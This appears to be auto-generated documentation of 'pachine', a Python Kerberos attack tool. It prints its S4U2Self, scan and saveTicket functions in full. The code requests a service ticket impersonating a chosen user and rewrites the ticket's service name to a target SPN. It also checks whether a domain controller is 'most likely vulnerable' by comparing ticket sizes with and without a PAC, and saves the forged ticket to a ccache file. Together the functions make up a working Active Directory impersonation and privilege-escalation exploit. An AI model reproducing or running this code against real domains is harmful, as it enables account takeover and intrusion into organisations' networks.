# Key Objects

[_Documentation generated by Documatic_](https://www.documatic.com)

<!---Documatic-section-pachine.S4U2Self-start--->
## pachine.S4U2Self

<!---Documatic-section-S4U2Self-start--->
<!---Documatic-block-pachine.S4U2Self-start--->
<details>
	<summary><code>pachine.S4U2Self</code> code snippet</summary>

```python
def S4U2Self(tgt, user, domain, spn, impersonate, cipher, sessionKey, kdcHost):
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(decodedTGT['ticket'])
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    opts = list()
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)
    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = str(decodedTGT['crealm'])
    clientName = Principal()
    clientName.from_asn1(decodedTGT, 'crealm', 'cname')
    seq_set(authenticator, 'cname', clientName.components_to_asn1)
    now = datetime.datetime.utcnow()
    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('AUTHENTICATOR')
        print(authenticator.prettyPrint())
        print('\n')
    encodedAuthenticator = encoder.encode(authenticator)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
    encodedApReq = encoder.encode(apReq)
    tgsReq = TGS_REQ()
    tgsReq['pvno'] = 5
    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq['padata'] = noValue
    tgsReq['padata'][0] = noValue
    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq['padata'][0]['padata-value'] = encodedApReq
    clientName = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
    S4UByteArray += b(impersonate) + b(domain) + b'Kerberos'
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('S4UByteArray')
        hexdump(S4UByteArray)
    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('CheckSum')
        hexdump(checkSum)
    paForUserEnc = PA_FOR_USER_ENC()
    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
    paForUserEnc['userRealm'] = domain
    paForUserEnc['cksum'] = noValue
    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
    paForUserEnc['cksum']['checksum'] = checkSum
    paForUserEnc['auth-package'] = 'Kerberos'
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('PA_FOR_USER_ENC')
        print(paForUserEnc.prettyPrint())
    encodedPaForUserEnc = encoder.encode(paForUserEnc)
    tgsReq['padata'][1] = noValue
    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc
    reqBody = seq_set(tgsReq, 'req-body')
    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.canonicalize.value)
    reqBody['kdc-options'] = constants.encodeFlags(opts)
    serverName = Principal(user, type=constants.PrincipalNameType.NT_UNKNOWN.value)
    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    reqBody['realm'] = str(decodedTGT['crealm'])
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    reqBody['till'] = KerberosTime.to_asn1(now)
    reqBody['nonce'] = random.getrandbits(31)
    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('Final TGS')
        print(tgsReq.prettyPrint())
    logging.info('Requesting S4U2self')
    message = encoder.encode(tgsReq)
    r = sendReceive(message, domain, kdcHost)
    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
    client = Principal()
    client.from_asn1(tgs, 'crealm', 'cname')
    server = Principal()
    server.from_asn1(tgs['ticket'], 'realm', 'sname')
    logging.info('Got TGS for %s for %s' % (client, server))
    cipherText = tgs['enc-part']['cipher']
    cipher = crypto._enctype_table[tgs['enc-part']['etype']]
    plainText = cipher.decrypt(sessionKey, 8, cipherText)
    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
    server = Principal()
    server.from_asn1(encTGSRepPart, 'srealm', 'sname')
    old_sname = str(server)
    server.components[0] = spn.split('/')[0]
    server.components.append(spn.split('/')[1])
    logging.info('Changing sname from %s to %s' % (old_sname, server))
    seq_set(encTGSRepPart, 'sname', server.components_to_asn1)
    plainText = encoder.encode(encTGSRepPart)
    cipherText = cipher.encrypt(sessionKey, 8, plainText, None)
    tgs['enc-part']['cipher'] = cipherText
    server = Principal()
    server.from_asn1(tgs['ticket'], 'realm', 'sname')
    server.components[0] = spn.split('/')[0]
    server.components.append(spn.split('/')[1])
    seq_set(tgs['ticket'], 'sname', server.components_to_asn1)
    r = encoder.encode(tgs)
    if logging.getLogger().level == logging.DEBUG:
        logging.debug('TGS_REP')
        print(tgs.prettyPrint())
    cipherText = tgs['enc-part']['cipher']
    plainText = cipher.decrypt(sessionKey, 8, cipherText)
    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
    cipher = _enctype_table[encTGSRepPart['key']['keytype']]
    return (r, cipher, sessionKey, newSessionKey)
```
</details>
<!---Documatic-block-pachine.S4U2Self-end--->
<!---Documatic-section-S4U2Self-end--->

# #
<!---Documatic-section-pachine.S4U2Self-end--->

<!---Documatic-section-pachine.scan-start--->
## pachine.scan

<!---Documatic-section-scan-start--->
<!---Documatic-block-pachine.scan-start--->
<details>
	<summary><code>pachine.scan</code> code snippet</summary>

```python
def scan(user, password, domain, lmhash, nthash, dc):
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    (tgt, _, _, _) = getKerberosTGT(userName, password, domain, lmhash, nthash, kdcHost=dc, requestPAC=False)
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    no_pac_len = len(decodedTGT['ticket']['enc-part']['cipher'])
    (tgt, _, _, _) = getKerberosTGT(userName, password, domain, lmhash, nthash, kdcHost=dc, requestPAC=True)
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    pac_len = len(decodedTGT['ticket']['enc-part']['cipher'])
    if no_pac_len < pac_len * SCAN_THRESHOLD:
        logging.info('Domain controller %s is most likely vulnerable' % dc)
        return True
    else:
        logging.warning('Domain controller %s is most likely not vulnerable' % dc)
        return False
```
</details>
<!---Documatic-block-pachine.scan-end--->
<!---Documatic-section-scan-end--->

# #
<!---Documatic-section-pachine.scan-end--->

<!---Documatic-section-pachine.saveTicket-start--->
## pachine.saveTicket

<!---Documatic-section-saveTicket-start--->
<!---Documatic-block-pachine.saveTicket-start--->
<details>
	<summary><code>pachine.saveTicket</code> code snippet</summary>

```python
def saveTicket(ticket, sessionKey, fileName):
    logging.info('Saving ticket in %s' % (fileName + '.ccache'))
    ccache = CCache()
    ccache.fromTGS(ticket, sessionKey, sessionKey)
    ccache.saveFile(fileName + '.ccache')
```
</details>
<!---Documatic-block-pachine.saveTicket-end--->
<!---Documatic-section-saveTicket-end--->

# #
<!---Documatic-section-pachine.saveTicket-end--->

[_Documentation generated by Documatic_](https://www.documatic.com)